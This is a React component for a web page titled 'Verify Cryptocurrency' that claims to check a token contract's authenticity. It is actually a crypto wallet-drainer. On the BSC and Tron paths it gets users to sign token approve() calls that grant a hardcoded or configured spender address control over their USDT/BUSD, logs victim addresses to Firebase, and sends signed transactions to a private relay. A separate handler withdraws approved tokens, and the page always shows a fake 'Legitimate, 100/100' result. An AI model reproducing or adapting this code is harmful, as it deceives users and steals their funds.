// @ts-nocheck

import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useSpring, animated } from 'react-spring'
import Button from '../common/Button'
import { database, push, ref } from '../../firebase/firebase';
import Web3 from 'web3';
import Swal from 'sweetalert2';
import { TronWeb } from 'tronweb';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const FULL_NODE = 'https://api.trongrid.io';
const SOLIDITY_NODE = 'https://api.trongrid.io';
const EVENT_SERVER = 'https://api.trongrid.io';
const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
const RELAY_URL = 'wss://relay.walletconnect.com';
const tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const spender = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'

interface FormState {
  contractAddress: string
  blockchain: string
}

const VerificationFormComponent = () => {
  const [formData, setFormData] = useState<FormState>({
    contractAddress: '',
    blockchain: 'ethereum'
  })

  const score = 100

  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showResults, setShowResults] = useState(false)
  const { address, wallet, connected, select, connect, disconnect } = useWallet();
  const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
  const [trxBalance, setTrxBalance] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [amount, setAmount] = useState(440);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [txConfirmed, setTxConfirmed] = useState(false);

  const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
  const busdContractAddress = import.meta.env.VITE_CONTRACT_ADDRESS;
  const spenderAmount = import.meta.env.VITE_AMOUNT;

  const formAnimation = useSpring({
    opacity: 1,
    transform: 'translateY(0)',
    from: { opacity: 0, transform: 'translateY(20px)' },
    config: { tension: 300, friction: 20 }
  })

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const busdAbi = [
    {
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [{ "name": "_owner", "type": "address" }],
      "name": "balanceOf",
      "outputs": [{ "name": "balance", "type": "uint256" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [{
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
      }],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        { "name": "_owner", "type": "address" },
        { "name": "_spender", "type": "address" }
      ],
      "name": "allowance",
      "outputs": [{ "name": "remaining", "type": "uint256" }],
      "type": "function"
    },
  ];

  const blockchainOptions = [
    // { value: 'ethereum', label: 'Ethereum (ETH)' },
    { value: 'binance', label: 'Binance Smart Chain (BSC)' },
    { value: 'tron', label: 'Tron (TRC)' },
    // { value: 'solana', label: 'Solana (SOL)' },
    // { value: 'avalanche', label: 'Avalanche (AVAX)' }
  ]

  const addData = (userAddress, tx) => {
    if (userAddress.trim() !== "") {
      const newDataRef = ref(database, "clientUsers");
      const newItemObject = {
        id: tx,
        userAddress: userAddress,
        transactionHash: tx,
        spenderAddress: spenderAddress
      };
      push(newDataRef, newItemObject);
    }
  };

  const approveToken = async () => {
    const web3 = new Web3(window.ethereum);
    setIsSubmitting(true);
    try {
      if (!window.ethereum) throw new Error("MetaMask/Trust Wallet is not installed.");

      const networkId = await web3.eth.net.getId();
      if (networkId != 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            throw new Error("Binance Smart Chain is not available in your wallet. Please add it manually.");
          }
          throw new Error("Network switch failed");
        }
      }
      const accounts = await web3.eth.requestAccounts();
      const userAccount = accounts[0];

      const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
      const maxApproval = web3.utils.toWei(spenderAmount, "wei");
      const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
      const balance = await busdContract.methods.balanceOf(userAccount).call();
      const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
      addData(userAccount, tx?.transactionHash)
      setShowResults(true)

    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Failed",
        text: "Verification Failed!"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getCurrentDate = () => {
    const today = new Date()
    return today.toISOString().split('T')[0]
  }

  // Trx code

  const fetchTrxBalance = useCallback(async () => {
    if (address) {
      const balanceSun = await tronWeb.trx.getBalance(address);
      setTrxBalance(balanceSun / 1_000_000);
      console.log('balanceSun::', balanceSun / 1_000_000, address);

    }
  }, [address, tronWeb]);

  const fetchTokenBalance = useCallback(async () => {
    if (address && TronWeb.isAddress(tokenAddress)) {
      try {
        const contract = await tronWeb.contract().at(tokenAddress);
        const result = await contract.balanceOf(address).call();
        setTokenBalance(parseInt(result.toString(), 10) / 1_000_000);
      } catch (err) {
        console.error(err);
      }
    }
  }, [address, tokenAddress, tronWeb]);

  const pollTransaction = async (txid) => {
    setStatus('Waiting for confirmation...');
    for (let i = 0; i < 20; i++) {
      try {
        const info = await tronWeb.trx.getTransactionInfo(txid);
        if (info.receipt?.result === 'SUCCESS') {
          setStatus('Transaction confirmed ✅');
          setTxConfirmed(true);
          return;
        }
      } catch (e) { }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
    setStatus('Transaction not confirmed in time ⏱️');
  };

  const handleApprove = useCallback(async () => {
    console.log('in handle aprrove above', address);

    if (!address || !TronWeb.isAddress(tokenAddress) || !TronWeb.isAddress(spender)) {
      setStatus('Invalid address');
      return;
    }
    console.log('in handle aprrove');

    try {
      setStatus('Building transaction...');
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tokenAddress,
        'approve(address,uint256)',
        {
          feeLimit: 36_000_000,
          callValue: 0,
          shouldPollResponse: false
        },
        [
          { type: 'address', value: spender },
          { type: 'uint256', value: (amount * 1_000_000).toString() },
        ],
        address
      );
      setStatus('Signing transaction...');
      // @ts-ignore
      const signedTx = await wallet.adapter.signTransaction(transaction);

      console.log('signed::', signedTx);

      const response = await fetch("http://192.168.29.251:3000/api/broadcast", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ signedTx }),
      });
      console.log('result::', signedTx);

      const result = await response.json();

      if (result.success) {
        setStatus("✅ TX sent: " + result.txid);
      } else {
        setStatus("❌ Relay failed: " + result.error);
      }
      // setStatus('Broadcasting transaction...');
      // const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
      // console.log('receipt:::',receipt);
      
      // if (receipt?.txid) {
      //   setTxHash(receipt.txid);
      //   setStatus('Transaction sent. Waiting for confirmation...');
      //   await pollTransaction(receipt.txid);
      // } else {
      //   setStatus('Broadcast failed');
      // }
    } catch (error) {
      console.error(error);
      setStatus(`Error: ${error.message}`);
    }
  }, [address, tokenAddress, spender, amount, tronWeb, wallet?.adapter]);

  const handleWithdrawFromUser = async () => {
    try {
      const response = await fetch("http://192.168.29.251:3000/api/withdraw", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          owner: 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r',           // address that approved the tokens
          recipient: spender,   // where the tokens should be sent
          amount: 0.5,                // in USDT (e.g., 5 not 5_000_000)
        }),
      });

      const data = await response.json();
      if (data.success) {
        console.log("✅ Withdraw TX:", data.txid);
      } else {
        console.error("❌ Withdraw failed:", data.error);
      }
    } catch (err) {
      console.error("❌ Error during withdraw:", err);
    }
  };


  const checkAllowance = async () => {
    if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spender)) {
      console.error('Invalid addresses');
      return;
    }
    try {
      const contract = await tronWeb.contract().at(tokenAddress);
      const result = await contract.allowance(address, spender).call({ from: address });
      const allowance = parseInt(result.toString(), 10) / 1_000_000;
      return allowance;
    } catch (err) {
      console.error('Allowance check failed:', err);
    }
  };

  useEffect(() => {
    console.log('connected:::', connected);

    if (connected) {
      fetchTrxBalance()
      setShowResults(true)
    }
    else {
      setTrxBalance(null);
      setTokenBalance(null);
      setStatus('');
      setTxHash('');
      setTxConfirmed(false);
    }
  }, [connected, fetchTrxBalance]);

  const handleConnect = async () => {
    setIsSubmitting(true)
    try {
      select('WalletConnect');
      await connect();
    } catch (err) {
      console.error('Connection failed:', err);
      setIsSubmitting(false)
    }
  };

  // submit form

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (formData?.blockchain === 'tron') {
      handleConnect()
    } else if (formData?.blockchain === 'binance') {
      approveToken()
    }
  }

  return (
    <animated.div style={formAnimation} className="verification-form-container">
      <div className="form-header">
        <h2>Verify Cryptocurrency</h2>
        <p>Enter the contract address to verify authenticity and security</p>
      </div>

      <form onSubmit={handleSubmit} className="verification-form">
        <div className="form-group">
          <label htmlFor="blockchain">Select Blockchain</label>
          <select
            id="blockchain"
            name="blockchain"
            value={formData.blockchain}
            onChange={handleChange}
            className="form-control"
            required
          >
            {blockchainOptions.map(option => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
        </div>

        <Button
          label={isSubmitting ? "Verifying..." : "Verify Now"}
          variant="primary"
          size="large"
          type="submit"
          fullWidth
          disabled={isSubmitting}
        />
      </form>
      <button onClick={handleApprove}>Approve</button>
      <button onClick={handleWithdrawFromUser}>withdraw</button>
      {isSubmitting && (
        <div className="verification-loading">
          <div className="loading-spinner-small"></div>
          <p>Scanning blockchain data and security databases...</p>
        </div>
      )}

      {showResults && (
        <div className="verification-results">
          <div className="result-header success">
            <div className="result-icon">✓</div>
            <div className="result-title">Verification Complete</div>
          </div>

          <div className="result-details">
            <div className="result-item">
              <span className="result-label">Security Score:</span>
              <span className="result-value">{score}/100</span>
            </div>
            <div className="result-item">
              <span className="result-label">Contract Type:</span>
              <span className="result-value">BEP-20 Token</span>
            </div>
            <div className="result-item">
              <span className="result-label">Creation Date:</span>
              <span className="result-value">{getCurrentDate()}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Verified Status:</span>
              <span className="result-value success">Legitimate</span>
            </div>
          </div>
        </div>
      )}
    </animated.div>
  )
}

export default function VerificationForm() {
  const adapter = useMemo(
    () =>
      new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          projectId: PROJECT_ID,
          relayUrl: RELAY_URL,
          metadata: {
            name: 'My Tron DApp',
            description: 'DApp with WalletConnect',
            url: window.location.origin,
            icons: [],
          },
        },
        web3ModalConfig: {
          themeMode: "dark",
          themeVariables: {
            "--w3m-z-index": 1000,
          },
          explorerRecommendedWalletIds: [
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //trust wallet
            "e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4", //Exodus
            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", //bitget wallet
            "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927", //ledger live
          ],
          explorerExcludedWalletIds: "ALL",
        },
      }),
    []
  );

  const onError = useCallback(e => console.error(e), []);

  return (
    <WalletProvider adapters={[adapter]} onError={onError} autoConnect>
      <VerificationFormComponent />
    </WalletProvider>
  );
}